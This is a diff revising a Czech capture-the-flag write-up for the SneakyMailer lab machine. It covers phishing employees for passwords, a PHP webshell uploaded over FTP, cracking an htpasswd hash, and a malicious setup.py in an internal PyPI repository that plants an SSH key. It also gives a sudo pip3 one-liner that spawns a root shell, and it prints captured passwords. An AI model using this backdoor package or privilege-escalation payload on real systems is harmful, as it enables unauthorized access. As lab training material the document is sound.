@@ -7,153 +7,202 @@ tags: linux ssh sudo php exploit enumeration
 ---
 ## Úvod a kontext
 
-SneakyMailer stojí na řetězení několika konkrétních slabin a artefaktů: anonymní FTP, nginx a SSH.
+SneakyMailer je zajímavý tím, že první přístup nevzniká klasickou technickou zranitelností, ale phishingem. Technická část začíná až ve chvíli, kdy se podaří získat cizí heslo a proměnit ho v přístup k interním službám. Díky tomu je celý stroj spíš o řetězení důvěry mezi poštou, webem, FTP a interním PyPI repozitářem než o jednom konkrétním exploitu.
 
-Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká SSH s nalezenými přihlašovacími údaji a teprve na něj navazuje příliš široká `sudo` oprávnění.
+Foothold vede přes vhost `dev.sneakycorp.htb`, FTP přístup účtu `developer` a jednoduchý webshell. Další pivot na uživatele `low` pak přichází přes interní balíčkovací infrastrukturu. Root část je už čistá konfigurace: `sudo pip3 install` bez omezení je v praxi téměř přímý root shell.
 
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+Nejdřív mapuji, jaké služby jsou na stroji dostupné zvenku a jestli se tu propojují web, pošta a souborové služby.
+
 ```bash
 ports=$(nmap -p- --min-rate=1000 -T4 -Pn $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v -Pn $IP
 ```
-```
+
+```text
 PORT     STATE SERVICE  VERSION
 21/tcp   open  ftp      vsftpd 3.0.3
-22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey:
-|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
-|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
-|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2
 25/tcp   open  smtp     Postfix smtpd
-|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
 80/tcp   open  http     nginx 1.14.2
-| http-methods:
-|_  Supported Methods: GET HEAD POST
-|_http-server-header: nginx/1.14.2
-|_http-title: Employee - Dashboard
-143/tcp  open  imap     Courier Imapd (released 2018)
-|_imap-capabilities: IDLE THREAD=ORDEREDSUBJECT ACL2=UNION completed UIDPLUS ENABLE SORT STARTTLS UTF8=ACCEPTA0001 THREAD=REFERENCES CAPABILITY QUOTA OK NAMESPACE IMAP4rev1 ACL CHILDREN
-| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
-| Subject Alternative Name: email:postmaster@example.com
-| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
-| Public Key type: rsa
-| Public Key bits: 3072
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2020-05-14T17:14:21
-| Not valid after:  2021-05-14T17:14:21
-| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
-[... výstup zkrácen ...]
-| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
-|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
-|_ssl-date: TLS randomness does not represent time
+143/tcp  open  imap     Courier Imapd
 8080/tcp open  http     nginx 1.14.2
-| http-methods:
-|_  Supported Methods: GET HEAD
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-server-header: nginx/1.14.2
-|_http-title: Welcome to nginx!
-Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+Už samotná kombinace SMTP, IMAP, FTP a více webových portů naznačuje, že půjde o prostředí s více interními workflow a pravděpodobně i více hostname.
+
+### Virtuální hosty
+
+Fuzzing host headeru odhalil subdoménu:
+
+```text
+dev.sneakycorp.htb
+```
+
+To je důležitý mezikrok, protože veřejný web na `80` nepůsobil jako přímý vstup, zatímco vývojový vhost často bývá napojený na interní uživatele nebo deploy proces.
 
 ## Analýza zjištění
 
-### Lámání hesel nebo hashů
+### Phishing jako zdroj prvních přihlašovacích údajů
 
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-```bash
-/usr/sbin/john SneakyMailer-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
+První skutečně použitelný posun přišel přes rozeslání phishingového e-mailu zaměstnancům a zachycení přihlašovacího POSTu. Tato část je důležitá hlavně rozhodovacím způsobem: když má cíl veřejný SMTP a zároveň firemní login formulář, je legitimní zkusit, jestli uživatelé zadávají hesla mimo důvěryhodný web.
+
+Zachycená data patřila účtu:
+
+```text
+paulbyrd@sneakymailer.htb
 ```
+
+Heslo po URL dekódování vyšlo na:
+
+```text
+^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 ```
-=> soufianeelhaoui
+
+To ještě nebyl finální foothold, ale otevřelo to cestu k dalším interním informacím. Následná práce s poštovním klientem ukázala i další uložené pověření:
+
+```text
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+```
+
+Právě účet `developer` měl pro další postup praktickou hodnotu.
+
+### Proč zkusit FTP a vývojový vhost
+
+Jakmile se objeví účet s názvem `developer` a současně existuje vhost `dev.sneakycorp.htb`, je rozumné zkusit, jestli stejné přihlašovací údaje neplatí i do FTP nebo deploy procesu. Tady to skutečně vyšlo: účet `developer` umožnil upload souboru na FTP.
+
+Po nahrání jednoduchého `cmd.php` bylo možné získat webshell na vývojové subdoméně:
+
+```text
+http://dev.sneakycorp.htb/cmd.php?c=...
 ```
 
 ## Získání přístupu
 
-### Přihlášení na cíl
+### Webshell a interní PyPI repozitář
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+Webshell neposkytl jen příkazy, ale hlavně pohled do lokálního prostředí. Z něj vyplynulo, že v síti existuje i interní PyPI repozitář:
+
 ```text
-pip Package - setup.py
+pypi.sneakycorp.htb
 ```
+
+Současně se podařilo získat `htpasswd` záznam pro účet `pypi`:
+
+```text
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
 ```
+
+Ten šel prolomit:
+
+```bash
+/usr/sbin/john SneakyMailer-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+```text
+soufianeelhaoui
+```
+
+Další rozhodující soubor byl `.pypirc`, který ukazoval, kam se balíčky nahrávají a jaké heslo použít:
+
+```ini
+[local]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui
+```
+
+To je zásadní moment celého stroje: nejde o „jen další heslo“, ale o možnost provést supply-chain pivot přes interní repozitář, kterému důvěřuje jiný lokální uživatel.
+
+### Pivot na `low` přes škodlivý balíček
+
+Stačilo připravit balíček, jehož `setup.py` při instalaci přidá vlastní SSH klíč do `authorized_keys` uživatele `low`:
+
+```python
 import setuptools
 
 try:
     with open("/home/low/.ssh/authorized_keys", "a") as f:
         f.write("ssh-rsa __CENSORED__== hack@t")
-        f.close()
-
-except Exception as e:
+except Exception:
     pass
 
 setuptools.setup(
     name="test",
     version="0.0.1",
-    author="Example Author",
-    author_email="author@example.com",
-    description="A small example package",
-    long_description="",
-    long_description_content_type="text/markdown",
-    url="https://github.com/pypa/sampleproject",
-    packages=setuptools.find_packages(),
-    classifiers=[
-        "Programming Language :: Python :: 3",
-        "License :: OSI Approved :: MIT License",
-        "Operating System :: OS Independent",
-    ],
 )
 ```
 
-### Přihlášení na cíl (2)
+Nahrání proběhlo přes lokální repozitář:
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+HOME=$(pwd)
+python3 setup.py sdist register -r local upload -r local
+```
+
+Jakmile cílový workflow balíček zpracoval, bylo možné se přihlásit jako `low`:
+
 ```bash
 ssh low@10.10.10.197
 ```
 
-### Získání user flagu
+Pak už šlo potvrdit běžný uživatelský přístup:
 
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
 ```bash
 cat user.txt
 ```
-```
+
+```text
 __CENSORED__
 ```
 
 ## Eskalace oprávnění
 
-### Průzkum možností eskalace
+### `sudo pip3 install`
 
-Hledám chybné konfigurace a cesty k vyšším oprávněním.
+První kontrola po přihlášení jako `low` vedla na `sudo -l`:
+
 ```bash
 sudo -l
 ```
-```
-=> (root) NOPASSWD: __CENSORED__
+
+```text
+(root) NOPASSWD: /usr/bin/pip3
 ```
 
-### Získání root flagu
+To je velmi silné oprávnění, protože `pip` při instalaci balíčku provádí kód ze `setup.py`. V praxi tedy nejde jen o správu Python balíčků, ale o možnost spustit libovolný kód jako root.
 
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+Stačilo vytvořit dočasný adresář s vlastním `setup.py`:
+
+```bash
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo /usr/bin/pip3 install $TF
+```
+
+Tím vznikl root shell a následně i přístup k `root.txt`:
+
 ```bash
 cat root.txt
 ```
-```
+
+```text
 __CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
 
-- Klíčový posun nepřinesl samotný scan, ale interpretace toho, co znamenaly anonymní FTP, nginx a SSH.
-- Uživatelský přístup dává v tomhle řetězci smysl až ve chvíli, kdy vyjde SSH s nalezenými přihlašovacími údaji.
-- Root/admin část nepřišla zkratkou; klíčovou roli tu hraje příliš široká `sudo` oprávnění a navazující lokální enumerace.
+- První použitelná pověření zde nevznikla z exploitu služby, ale z phishingu a následného reuse mezi interními systémy.
+- Účet `developer` měl hodnotu hlavně proto, že otevřel FTP upload na vývojový vhost a tím i jednoduchý webshell.
+- Skutečně zajímavý pivot vedl přes interní PyPI repozitář, kterému jiný lokální účet důvěřoval při instalaci balíčků.
+- Root část byla čistá chyba v delegaci: `sudo pip3 install` dovoluje spustit kód ze `setup.py` jako root.
 
 ## Co si odnést do praxe
 
-- První obranná lekce míří na anonymní FTP, nginx a SSH. Anonymní FTP a podobná odkladiště je potřeba vnímat jako veřejný publikační kanál; často prozradí další hostname, workflow nebo interní soubory.
-- Druhá lekce je o tom, jak rychle se ze zjištění stane SSH s nalezenými přihlašovacími údaji. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
-- Třetí lekce připomíná riziko, které v praxi představuje příliš široká `sudo` oprávnění. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
+- Poštovní infrastruktura je plnohodnotná součást útočné plochy. I bez technické zranitelnosti může phishing přinést první heslo, které otevře další interní služby.
+- Vývojové vhosty a FTP účty by neměly sdílet stejná pověření s běžnými uživatelskými účty. Jinak se z jedné kompromitované identity stává deploy přístup.
+- Interní repozitáře balíčků jsou citlivý supply-chain prvek. Pokud útočník získá možnost do nich nahrávat, může kompromitovat všechny systémy nebo účty, které z nich instalují.
+- `sudo` oprávnění pro správce balíčků je potřeba posuzovat jako možnost spouštět libovolný kód. `pip`, `npm`, `gem` a podobné nástroje nejsou bezpečné „jen instalační utility“.
